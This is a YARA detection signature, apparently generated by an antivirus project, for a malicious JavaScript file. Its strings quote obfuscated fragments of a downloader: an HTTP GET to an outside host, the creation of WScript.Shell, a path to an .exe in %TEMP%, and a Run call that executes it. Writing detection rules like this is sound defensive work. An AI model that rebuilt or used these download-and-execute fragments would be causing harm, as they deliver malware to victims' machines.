rule sig_20160328_0d556a3610fff8dcaa668c1112612bc1 {
  meta:
    description = "datamaliciousorder - file 20160328_0d556a3610fff8dcaa668c1112612bc1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "712aac8d2540f5afb59a73d20723e2ba430a55d57e8a4114b182fc1a61eaea7d"

  strings:
    $s1  = "function Ntdftu() {return Kgwwkuhfz[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"UryUwcb5vg5.exe\";};" fullword ascii
    $s2  = "Opmzgahqo[Hglgelp](\"GET\", \"http://teknosolar.com/xw3ika\", false);" fullword ascii
    $s3  = "do {WScript[Ctplyvpcet](Bwjoniwmxt() * 11)} while (Opmzgahqo[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Kgwwkuhfz = function Pdzcfkqonw() {return WScript[Pkhzdggohx](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Nrqds(Chycvtagw, Snalrvn){return Chycvtagw - Snalrvn;};" fullword ascii
    $s6  = "function Cgdvi(Xjpajgg) {var Nchcc = (1, 2, 3, 4, 5, Xjpajgg); return Nchcc;};" fullword ascii
    $s7  = "function Slcuylzt(){return Ojbujdyqh;};" fullword ascii
    $s8  = "var Klwoi = false;" fullword ascii
    $s9  = "function Vontgppzck(){return Pkhzdggohx;};" fullword ascii
    $s10 = "Kprcibfe = true; " fullword ascii
    $s11 = "var Hqfhgf = false;" fullword ascii
    $s12 = "Klwoi = true; " fullword ascii
    $s13 = " while (Vxfxrcwrnr){" fullword ascii
    $s14 = "function Edudzsfph()" fullword ascii
    $s15 = "var Kprcibfe = false;" fullword ascii
    $s16 = "var Jswux = new this[\"Date\"]();" fullword ascii
    $s17 = "function Bwjoniwmxt(){return 22;};" fullword ascii
    $s18 = "return Nrqds(Zscymppazx, Dditps);" fullword ascii
    $s19 = "function Nzipuampoo() {return ((Kprcibfe == true) && (Kprcibfe == Klwoi)) ? 1 : Scaoqpve;};" fullword ascii
    $s20 = "function Csdskw(Dqiaeddh){Kgwwkuhfz[\"Run\"](Dqiaeddh, Scaoqpve, Scaoqpve);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}